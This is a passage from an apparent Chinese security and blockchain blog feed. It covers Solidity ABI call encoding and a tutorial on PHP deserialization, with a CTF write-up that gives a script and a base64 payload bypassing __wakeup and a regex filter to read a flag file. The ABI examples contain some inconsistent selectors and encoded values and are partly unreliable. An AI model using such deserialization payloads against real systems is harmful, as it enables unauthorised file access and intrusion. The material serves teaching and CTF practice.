0，数组元素为给定类型。</p></li><li><p>非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…，<code>Tn</code>，<code>n &gt;= 0</code> 构成的 元组tuple。</li></ul></li></ul><ul><li><p>对参数的编码具有以下属性：</p><p>1、读取的次数取决于参数数组结构中的最大深度；也就是说，要取得 <code>a_i[k][l][r]</code> 需要读取 <strong>4</strong> 次。在先前的 <strong>ABI</strong> 版本中，在最糟的情况下，读取的次数会随着动态参数的总数而线性地增长。</p><p>2、一个变量或数组元素的数据，不会被插入其他的数据，并且是可以再定位的；也就是说，它们只会使用相对的 “地址”。</p></li><li><p>还需要区分静态和动态类型：</p><p>以下类型被称为<strong>动态</strong>：</p><ul><li><code>bytes</code></li><li><code>string</code></li><li>任意类型 T 的变长数组 <code>T[]</code></li><li>任意动态类型 T 的定长数组 <code>T[k]</code> （<code>k &gt;= 0</code>）</li><li>由动态的 <code>Ti</code> （<code>1 &lt;= i &lt;= k</code>）构成的 元组元组 <code>(T1,...,Tk)</code></li></ul><p>而所有非动态类型被称为<strong>静态</strong>。</p><p>静态类型会被直接编码，动态类型会在当前数据块之后单独分配的位置被编码。</p><p>参考动态类型的编码原理；<a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">https://ctf-wiki.org/blockchain/ethereum/selector-encoding/</a></p><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其<code>offset、length、data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul></li></ul><ul><li>一般来说大体而言，一个以 <code>a_1, ..., a_n</code> 为参数的对 <code>f</code> 函数的调用，会被编码<code>function_selector(f) enc((a_1, ..., a_n))</code>，<code>f</code> 的返回值 <code>v_1, ..., v_k</code> 会被编码为<code>enc((v_1, ..., v_k))</code>，也就是说，返回值会被组合为一个元组进行编码。</li></ul><h4 id="0x04-例子："><a href="#0x04-例子：" class="headerlink" title="0x04 例子："></a>0x04 例子：</h4><h6 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line">    uint public x;</span><br><span class="line">    function test(uint, uint32[] memory, bytes10, bytes memory) public &#123; </span><br><span class="line">    x = 1; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对以上合约的函数，其函数调用的最终编码为：</p><ul><li><p><code>test(0x123,[&quot;0x11221122&quot;,&quot;0x33443344&quot;],&quot;0x31323334353637383930&quot;,&quot;0x3132333435&quot;)</code></p><ul><li><p>函数选择器：<code>0xa5643bf2</code>，源自<code>test(uint,uint32,bytes10,bytes)</code>的签名；</p></li><li><p>第一个参数 <strong>uint</strong>（静态类型），直接存储其值：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</p></li><li><p>第二个参数 **uint32 []**（动态数组），先存储其 <strong>offset=0x20*4</strong>（4 是参数个数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</p></li><li><p>第三个参数 <strong>bytes10</strong>（静态类型），直接存储其值（从低位开始补0）：<code>0x313233343536373839300000000000000000000000000000000000000000000</code>；</p></li><li><p>第四个参数 <strong>bytes</strong>（动态类型），先存储其 <strong>offset=0x80+0x20*3=0xe0（需要加上前一个动态类型参数的offse，3是前一个动态类型存储其长度和俩个元素占用的插槽个数）</strong>：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>;</p></li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li>第二个参数的长度（<strong>length</strong>）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000011221122</code>;</li><li>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000033443344</code>;</li><li>第四个参数的长度（<strong>length</strong>），5个字节：<code>0x0000000000000000000000000000000000000000000000000000000000000005</code>；</li><li>第四个参数的数据部分（从低位补0）：<code>0x3132333435000000000000000000000000000000000000000000000000000000</code>。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x577563b6                                                             // function selector</span><br><span class="line">0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter</span><br><span class="line">1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter</span><br><span class="line">2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter</span><br><span class="line">3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter</span><br><span class="line">4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter</span><br><span class="line">5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter</span><br><span class="line">6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter</span><br><span class="line">7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter</span><br><span class="line">8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="例2："><a href="#例2：" class="headerlink" title="例2："></a>例2：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function bar(bytes3[2]) public pure &#123;&#125;</span><br><span class="line">  function baz(uint32 x, bool y) public pure returns (bool r) &#123; </span><br><span class="line">  r = x &gt; 32 || y; </span><br><span class="line">  &#125;</span><br><span class="line">  function sam(bytes, bool, uint[]) public pure &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>对于以上合约使用参数 <strong>69</strong> 和 <strong>true</strong> 去调用 <strong>baz</strong>，一共需要传送 <strong>68</strong> 字节，其函数调用的最终编码为：</p><ul><li>函数选择器：<code>0xcdcd77c0</code>，这源自ASCII格式的 <code>baz(uint32,bool)</code> 签名的 <strong>keccak</strong> 哈希的前 4 字节。</li><li>第一个参数，一个被用 0 值字节补充到 32 字节的 uint32 值 <code>69</code>（hex(69)）：<code>0x0000000000000000000000000000000000000000000000000000000000000045</code>：。</li><li>第二个参数，一个被用 0 值字节补充到 32 字节的 boolean 值 <code>true</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>：。</li></ul><p>合起来就是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xcdcd77c000000000000000000000000000000000000000000000000000000000000000450000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></li><li><p>使用<code>dave、ture、[1,2,3]</code>作为参数调用 <strong>sam</strong>，一共需要传送 <strong>292</strong> 字节。</p><ul><li>函数选择器：<code>0xa5643bf2</code>，源自<code>sam(bytes,bool,uint256[])</code>的签名；</li><li>第一个参数（动态类型）的数据部分的位置（从参数编码块开始算起的字节数）：<code>0x0000000000000000000000000000000000000000000000000000000000000060</code>；</li><li>第二个参数（bool 类型的 trure）：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第三个参数（动态类型）的数据部分的位置，由字节数计量，这里是<code>0x0a</code>：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第一个参数的数据部分，以字节数组的元素个数作为开始，这里是<code>4</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000004</code>;</li><li>第一个参数的内容（dave）的 UTF-8 编码（这里等同于ASCII编码），并在低位补0到32字节：<code>0x6461766500000000000000000000000000000000000000000000000000000000</code>;</li><li>第三个参数的数据部分以数组元素的个数开始，这里是<code>3</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li><li>第三个参数的第一个数组元素，1：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>;</li><li>第三个参数的第二个数组元素，2：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第三个参数的第三个数组元素，3：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li></ul><p>合起来就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa5643bf20000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000464617665000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003</span><br></pre></td></tr></table></figure></li></ul><h6 id="例3："><a href="#例3：" class="headerlink" title="例3："></a>例3：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function f(uint,uint32[],bytes10,bytes) public pure &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用参数<code>(0x123, [0x456, 0x789], &quot;1234567890&quot;, &quot;Hello, world!&quot;)</code>进行对函数<code>f(uint,uint32[],bytes10,bytes)</code>的调用会通过以下方式进行编码：</p><ul><li>函数选择器：<code>0x8be65246</code>;</li><li>第一个参数 <strong>uint</strong>（静态类型），直接存储其 <strong>data</strong>：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</li><li>第二个参数 **uint32 []*<em>（动态类型），先存储其 offset=0x20</em>4（4个参数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</li><li>第三个参数 <strong>bytes10</strong> (静态类型)，直接存储其 <strong>data</strong>（先转为 <strong>ASCII</strong> 码，从低位开始补充0到32字节）：<code>0x3132333435363738393000000000000000000000000000000000000000000000</code>；</li><li>第四个参数 <strong>bytes</strong> (动态类型)，先存储其 <strong>offset=0x80+3*0x20</strong>=第一个动态参数的<strong>offset</strong> + 第一个动态参数的数据部分的长度 ：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>；</li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li><p>第二个参数的 <strong>length</strong>（两个数组元素）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>；</p></li><li><p>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000456</code>；</p></li><li><p>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000789</code>；</p></li><li><p>第四个参数的 <strong>length</strong>（13 个字节）：<code>0x000000000000000000000000000000000000000000000000000000000000000d</code>；</p></li><li><p>第四个参数的数据部分（需要对 <strong>Hello, World!</strong> 进行编码，如下图）：<code>0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000</code>；</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/6.png" alt="6"></p></li></ul></li><li><p>将结果合在一起：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8be65246</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000123</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000080</span><br><span class="line">  3132333435363738393000000000000000000000000000000000000000000000</span><br><span class="line">  00000000000000000000000000000000000000000000000000000000000000e0</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000002</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000456</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000789</span><br><span class="line">  000000000000000000000000000000000000000000000000000000000000000d</span><br><span class="line">  48656c6c6f2c20776f726c642100000000000000000000000000000000000000 </span><br></pre></td></tr></table></figure></li></ul><h4 id="0x05-ABI函数"><a href="#0x05-ABI函数" class="headerlink" title="0x05 ABI函数"></a>0x05 ABI函数</h4><ul><li><p><code>abi.encodePacked(...) returns (bytes)</code>：对给点参数执行紧打包编码，即</p><ul><li>对函数选择器不进行编码；</li></ul></li><li><p>长度低于32字节的类型，即不会进行补0操作，也不会进行符号扩展；</p><ul><li>动态类型会直接进行编码，并且不包含长度信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line">    function AbiEncodePacked() public view returns (bytes memory) &#123;</span><br><span class="line">        bytes memory result  = abi.encodePacked(a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423224621777.png" alt="image-20220423224621777"></p></li><li><p><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>：对给定的第二个参数开始的参数进行编码，并以给定的函数选择器作为起始的4字节数据一起返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line"></span><br><span class="line">    function encodeWithSelector() public  view returns(bytes memory)&#123;</span><br><span class="line">        bytes memory result = abi.encodeWithSelector(this.encodeWithSelector.selector,a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423230914216.png" alt="image-20220423230914216"></p></li><li><p><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>:与<code>encodeWithSelector</code>等价</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-Basic-Design&quot;&gt;&lt;a href=&quot;#0x01-Basic-Design&quot; class=&quot;headerlink&quot; title=&quot;0x01 Basic Design&quot;&gt;&lt;/a&gt;0x01 Basic Design&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;AB</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化及POP链构造</title>
    <link href="https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-16T01:24:02.000Z</published>
    <updated>2021-10-17T12:35:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p>php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包含字节流的字符串来表示，如以下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>  = <span class="string">&quot;this is a str&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;Bob&quot;</span>,<span class="string">&quot;sex&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字符串str序列化操作：s:13:&quot;this is a str&quot; s:16表示字符串长度为16</span></span><br><span class="line"><span class="comment">//数组arr序列化操作：a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;sex&quot;;s:1:&quot;m&quot;;&#125;</span></span><br><span class="line"><span class="comment">//类A序列化操作：O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125; O代表对象，A是类名，a是类实例化后的对象名，i是数值型</span></span><br><span class="line"><span class="comment">//类B序列化操作：O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>由于序列化一个对象会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字，所以A和B序列化后的代码除了类名都是相同的。而unserialize()函数就是将序列化后的值返回 <strong>php</strong> 原来的值。</p><ul><li><p>反序列化中的魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//读取不可访问（protected 或 private）或不存在的属性的值时被调用</span></span><br><span class="line">__set()<span class="comment">//在给不可访问（protected 或 private）或不存在的属性赋值时</span></span><br><span class="line">__invoke()<span class="comment">//当以调用函数的方式调用一个对象时会执行</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br><span class="line">__isset()   <span class="comment">//当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>public、protected与private</strong> 区别：</p><ul><li><p><strong>protected：</strong></p><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时字段名前会加上<code>\0*\0</code>的前缀，这里的<code>\0</code>表示 ASCII 码为 0 的字符（不可见字符），不是<code>\0</code>字符串。</p><p>所以在输入反序列化值时需要给保护变量前加上<code>\0*\0</code>，例如：</p><p><code>O:4:&quot;Name&quot;:2:&#123;s:11:&quot;\0*\0username&quot;;s:5:&quot;admin&quot;;s:11:&quot;\0*\0password&quot;;i:100;&#125;</code></p></li><li><p><strong>private：</strong></p><p>private 声明的字段为私有字段，只有其声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前都会加上<code>\0</code>的前缀，字符串长度也包括所加前缀的长度，其中<code>\0</code>字符也是计算长度的，例如：</p><p><code>O:4:&quot;Name&quot;:3：&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;</code></p><p>在浏览器中提交时可以用<code>%00</code>来替换<code>\0</code>，使用 <strong>url</strong> 编码，使用 <strong>PHP</strong> 输出时可以用使用<code>urlencode()</code>函数。</p></li></ul></li></ul><h4 id="0x02-漏洞产生"><a href="#0x02-漏洞产生" class="headerlink" title="0x02 漏洞产生"></a>0x02 漏洞产生</h4><p>当 <strong>serialize()</strong> 函数执行时首先会检查是否存在魔术方法 <code>__sleep()</code>，当该魔术方法存在时会被首先调用，然后才执行序列化操作。而 <code>unserialize()</code> 函数执行时会检查存在一个 <code>__wakeup()</code> 魔术方法，若存在该魔术方法则会先调用 <code>__wakeup()</code>。所以漏洞的根源在于 <code>unserialize()</code> 函数的参数可控。</p><p>例如该代码中存在反序列化漏洞：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：当反序列化时的字符串所对应的对象的数目被修改，<code>__wake()</code> 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如 <strong>__destruct()</strong></p><p>所以针对以上代码构造序列化值：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;111&quot;;&#125;</code>,修改对应的字符串数目即可绕过 <code>wakeup()</code>。</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p><h4 id="0x02-实践学习"><a href="#0x02-实践学习" class="headerlink" title="0x02 实践学习"></a>0x02 实践学习</h4><h5 id="①-Web-php-unserialize"><a href="#①-Web-php-unserialize" class="headerlink" title="① Web_php_unserialize"></a>① Web_php_unserialize</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;  <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>; <span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; <span class="comment">//wakeup()函数返回index.php，所以必须绕过</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码分析返回 <strong>fl4g.php</strong> 必须要满足以下条件：</p><ol><li><p>绕过 wakeup() 函数</p><p>当反序列化时的字符串所对应的对象的数目被修改,<code>_wake()</code>的函数就不会被调用。</p></li><li><p>绕过正则表达式</p><p><code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>该正则表达式的意思是若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式被过滤。</p><p>使用<code>O：+4</code>来绕过</p></li><li><p>对序列化的内容进行 <strong>Base64</strong> 加密</p></li></ol><p>由于代码中的 <strong>file</strong> 为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即**%00<strong>），字符串长度也比实际长度大 ，如果将序列化结果复制到在线的 <strong>base64</strong> 网站进行编码可能就会丢掉空白字符，这里直接在</strong>PHP** 代码中实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$A</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$var</span> = serialize(<span class="variable">$A</span>);</span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="comment">//O:+4:&quot;Demo&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload：</strong><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h5 id="②-phar-反序列化："><a href="#②-phar-反序列化：" class="headerlink" title="② phar 反序列化："></a>② phar 反序列化：</h5><p><strong>phar</strong> 可以理解为 <strong>php</strong> 压缩文档，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 <strong>php</strong> 访问并执行，与 <code>file://，php://</code>等伪协议类似，也是一种流包装器。</p><p><strong>phar</strong> 由四部分组成：</p><ul><li><strong>stub：</strong> <strong>phar</strong> 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li><li><strong>manifest：</strong>压缩文件的属性等信息，以序列化存储；</li><li><strong>contents：</strong>压缩文件的内容；</li><li><strong>signature：</strong>签名，放在文件末尾。</li></ul><blockquote><p>注意：</p><ol><li>这里的文件标识必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但是之前的内容没有限制，即可以通过伪造一个图片文件或者 pdf 文件来绕过一些上传限制；</li><li>phar 存储的 meta-data 信息以序列化的方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 